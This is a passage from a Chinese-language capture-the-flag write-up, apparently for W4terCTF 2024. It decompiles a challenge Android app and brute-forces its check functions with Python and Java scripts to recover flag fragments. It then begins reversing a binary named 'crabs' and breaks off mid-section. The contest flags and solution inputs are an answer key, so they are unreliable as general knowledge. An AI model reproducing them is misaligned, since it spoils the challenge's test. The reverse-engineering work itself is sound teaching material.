<p><code>W4terCTF&#123;UnR3IAtED_8y73S_CAN_6e_3nUmErAT3d&#125;</code></p>
<h3 id="安安又卓卓">安安又卓卓</h3>
<h4 id="第一问：剪刀石头布">第一问：剪刀石头布</h4>
<p>这一问可以使用APKTool进行逆向</p>
<p>用法参考<a target="_blank" rel="noopener" href="https://juejin.cn/post/7216968724938195001">https://juejin.cn/post/7216968724938195001</a></p>
<p>可以得到反编译的Smali代码</p>
<p>在<code>smali\com\w4ter\w4terctf2024\FirstChall.smali</code>中找到以下代码</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali">:array_0<br><span class="hljs-keyword">    .array</span>-data 2<br>        0x32s<br>        0x33s<br>        0x32s<br>        0x32s<br>        0x32s<br>        0x32s<br>        0x32s<br>        0x33s<br>        0x32s<br>        0x31s<br>        0x31s<br>        0x32s<br>        0x31s<br>        0x31s<br>        0x31s<br>        0x32s<br>        0x32s<br>        0x33s<br>        0x31s<br>        0x32s<br><span class="hljs-keyword">        .</span>.....<br></code></pre></td></tr></table></figure>
<p>经验证，这是机器的出拳顺序</p>
<p>要想赢得机器，对手出2，我出1，对手出3，我出2，对手出1，我出3。</p>
<p>运行下面的脚本，得到我方出拳顺序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">rival=[<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(rival))<br>my = []<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> rival:<br>    my.append((x+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> my:<br>    <span class="hljs-built_in">print</span>(x,end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">1211111213313331123112111232113113213322122121121231121112122232132131121222112212133233122212211221121213221131133331131313223212313113132123311232131113211312123211311231131312221123133313111231311313212221123112321313232213211113132133311321131113123222<br></code></pre></td></tr></table></figure>
<p>粘贴到安卓程序中，得到以下flag片段</p>
<p><code>Android_is_very_interesting_and_</code></p>
<h4 id="第二问：猜数字">第二问：猜数字</h4>
<p>第二第三问需要以下工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/java-decompiler/jd-gui">https://github.com/java-decompiler/jd-gui</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/pxb1988/dex2jar">https://github.com/pxb1988/dex2jar</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/katrinawj/article/details/80016315">https://blog.csdn.net/katrinawj/article/details/80016315</a></p>
<p>这样反编译可以得到java代码，可读性比smali更优</p>
<p>在<code>com/w4ter.w4terctf2024/SecondCheck.class</code>，其中的函数<code>check0</code>到<code>check15</code>就是分别对16个数字进行检验</p>
<p>以<code>check10</code>为例，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check10</span><span class="hljs-params">(<span class="hljs-type">int</span> paramInt)</span> &#123;<br>  paramInt = xor(xor(xor(add(mul(add(mul(xor(add(mul(sub(paramInt, <span class="hljs-number">5</span>), <span class="hljs-number">2</span>), <span class="hljs-number">3</span>), <span class="hljs-number">8</span>), <span class="hljs-number">11</span>), <span class="hljs-number">8</span>), <span class="hljs-number">14</span>), <span class="hljs-number">14</span>), <span class="hljs-number">6</span>), <span class="hljs-number">10</span>), <span class="hljs-number">13</span>);<br>  <span class="hljs-type">boolean</span> <span class="hljs-variable">bool</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>  <span class="hljs-keyword">if</span> (sub(mul(xor(sub(add(paramInt, <span class="hljs-number">1</span>), <span class="hljs-number">9</span>), <span class="hljs-number">12</span>), <span class="hljs-number">3</span>), <span class="hljs-number">4</span>) != <span class="hljs-number">1117943</span>)<br>    bool = <span class="hljs-literal">false</span>; <br>  <span class="hljs-keyword">return</span> bool;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>使用下面的python脚本，可以枚举出第10个数字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a ^ b<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a + b<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a - b<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a * b<br><br>i=<span class="hljs-number">10</span><br>up = <span class="hljs-number">2</span>**(i+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, up+<span class="hljs-number">1</span>):<br>    paramInt = j<br>    paramInt = xor(xor(xor(add(mul(<br>        add(mul(xor(add(mul(sub(paramInt, <span class="hljs-number">5</span>), <span class="hljs-number">2</span>), <span class="hljs-number">3</span>), <span class="hljs-number">8</span>), <span class="hljs-number">11</span>), <span class="hljs-number">8</span>), <span class="hljs-number">14</span>), <span class="hljs-number">14</span>), <span class="hljs-number">6</span>), <span class="hljs-number">10</span>), <span class="hljs-number">13</span>)<br>    i = sub(paramInt, <span class="hljs-number">6</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (sub(mul(xor(sub(add(paramInt, <span class="hljs-number">1</span>), <span class="hljs-number">9</span>), <span class="hljs-number">12</span>), <span class="hljs-number">3</span>), <span class="hljs-number">4</span>) != <span class="hljs-number">1117943</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<p>运行结果是1217</p>
<p>类似的，可以得到全部16个数字</p>
<p>2,3,7,14,18,44,82,235,365,715,1217,3774,6025,14042,28572,51291</p>
<p>输入到安卓程序中，得到以下flag片段</p>
<p><code>Smkhwxi8wnGu14Jq</code></p>
<h4 id="第三问：直捣黄龙">第三问：直捣黄龙</h4>
<p>在<code>com/w4ter.w4terctf2024/ThirdCheck.class</code>，其中的函数<code>check0</code>到<code>check23</code>就是分别对24个字母进行检验</p>
<p>与之前不同的是，代码中加入了些奇怪的东西</p>
<p><img src="./W4terCTF2024.assets/1cfaVgDsSPFkeyB.png" srcset="/img/loading.gif" lazyload alt="android-3"></p>
<p>要想结束while循环，就必须执行3处的break，所以正确的字母输入后一定会执行2和3处的代码</p>
<p>2处的代码会用到i的值，如果输入正确的字母后，只执行2处代码没有执行1处的代码，i的值就恒定为0而与paramInt无关，结果是paramInt输入任何值都是合法的，这显然不合理，所以1处的代码一定会被执行</p>
<p>综上分析，第三问混淆的代码应该不会影响正常的执行逻辑，可以直接无视。</p>
<p>和第二问一样，写出以下脚本枚举字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a ^ b<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a + b<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a - b<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> a * b<br><br><span class="hljs-comment"># paramInt = 2</span><br><span class="hljs-comment"># print(xor(xor(add(mul(add(xor(add(xor(sub(sub(add(xor(xor(paramInt, 1), 7), 7), 13), 8), 14), 5), 2), 12), 10), 14), 2), 5))</span><br>up=<span class="hljs-number">256</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,up+<span class="hljs-number">1</span>):<br>    paramInt = j<br>    i = sub(add(add(xor(paramInt, <span class="hljs-number">9</span>), <span class="hljs-number">3</span>), <span class="hljs-number">10</span>), <span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">if</span> (sub(mul(xor(mul(i, <span class="hljs-number">1</span>), <span class="hljs-number">2</span>), <span class="hljs-number">3</span>), <span class="hljs-number">5</span>) == <span class="hljs-number">313</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;j&#125;</span>,<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span>&quot;</span>)<br>    <br><br></code></pre></td></tr></table></figure>
<p>可以得到第三个字符是<code>l</code></p>
<p>类似的，可以枚举得出其他字符，结果为</p>
<p><code>I_like_Android_Reverse!!</code></p>
<h4 id="java脚本">java脚本</h4>
<blockquote>
<p>更简便的方法？</p>
</blockquote>
<p>利用已有的 java 源代码可写 java 脚本爆破：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.System;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> SecondCheck.SecondCheck;<br><span class="hljs-keyword">import</span> ThirdCheck.ThirdCheck;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hack</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] ENC2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123; <br>        <span class="hljs-number">901</span>, <span class="hljs-number">1554</span>, <span class="hljs-number">17367</span>, <span class="hljs-number">53318</span>, <span class="hljs-number">68796</span>, <span class="hljs-number">19575</span>, <span class="hljs-number">1957</span>, <span class="hljs-number">1461</span>, <span class="hljs-number">485</span>, <span class="hljs-number">790</span>, <br>        <span class="hljs-number">1281</span>, <span class="hljs-number">218036</span>, <span class="hljs-number">54829</span>, <span class="hljs-number">2367142</span>, <span class="hljs-number">28073245</span>, <span class="hljs-number">51410</span> &#125;;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">char</span>[] flag1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= Math.pow(<span class="hljs-number">2</span>,<span class="hljs-number">16</span>); i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">16</span>; j++)&#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> SecondCheck.class.getDeclaredMethod(<span class="hljs-string">&quot;check&quot;</span> + j, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">int</span>.class &#125;);<br>                method.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">if</span> (callCheck(method, (i))) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;flag&quot;</span> + j;<br>                    Class&lt;Integer&gt; clazz = <span class="hljs-type">int</span>.class;<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> SecondCheck.class.getDeclaredMethod(str1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; clazz, clazz &#125;);<br>                    method2.setAccessible(<span class="hljs-literal">true</span>);<br>                    flag1[j] = (<span class="hljs-type">char</span>)callFlag(method2, ENC2[j], i);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">char</span>[] flag2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">24</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">256</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">24</span>; j++) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ThirdCheck.class.getDeclaredMethod(<span class="hljs-string">&quot;flag&quot;</span> + j, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">int</span>.class &#125;);<br>                method.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">if</span> (callFlag(method, i)) &#123;<br>                    flag2[j] = (<span class="hljs-type">char</span>)i;<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(flag1);<br>        System.out.println(flag2);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">callFlag</span><span class="hljs-params">(Method paramMethod, <span class="hljs-type">int</span> paramInt)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> paramMethod.invoke(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThirdCheck</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Integer.valueOf(paramInt) &#125;);<br>        <span class="hljs-keyword">return</span> (object <span class="hljs-keyword">instanceof</span> Boolean) ? ((Boolean)object).booleanValue() : <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">callFlag</span><span class="hljs-params">(Method paramMethod, <span class="hljs-type">int</span> paramInt1, <span class="hljs-type">int</span> paramInt2)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> paramMethod.invoke(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecondCheck</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Integer.valueOf(paramInt1), Integer.valueOf(paramInt2) &#125;);<br>        <span class="hljs-keyword">return</span> (object <span class="hljs-keyword">instanceof</span> Integer) ? ((Integer)object).intValue() : <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">callCheck</span><span class="hljs-params">(Method paramMethod, <span class="hljs-type">int</span> paramInt)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> paramMethod.invoke(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecondCheck</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Integer.valueOf(paramInt) &#125;);<br>        <span class="hljs-keyword">return</span> (object <span class="hljs-keyword">instanceof</span> Boolean) ? ((Boolean)object).booleanValue() : <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac Hack.java <br>java Hack<br></code></pre></td></tr></table></figure>
<p>可以直接得到后面两关的 flag 片段:</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Smkhwxi8wnGu14Jq<br>I_like_Android_Reverse!!<br></code></pre></td></tr></table></figure>
<h3 id="crabs">crabs</h3>
<p>使用IDA进行逆向</p>
<p>反编译main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Enter your flag, and get a picture&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, &amp;v8);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_1209(&amp;v8) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Here is your picture&quot;</span>);<br>  sub_1483(&amp;qword_8390);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_2B4D(&amp;qword_8390, &amp;v8, v4, v5, v6, v7, v8, v9) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nonono, ugly picute&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;okokok, nice picture&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag is W4terCTF&#123;%s&#125;\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)&amp;v8);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br></code></pre></td></tr></table></figure>
<h4 id="sub-1209">sub_1209</h4>
<p><code>sub_1209</code>的代码</p>
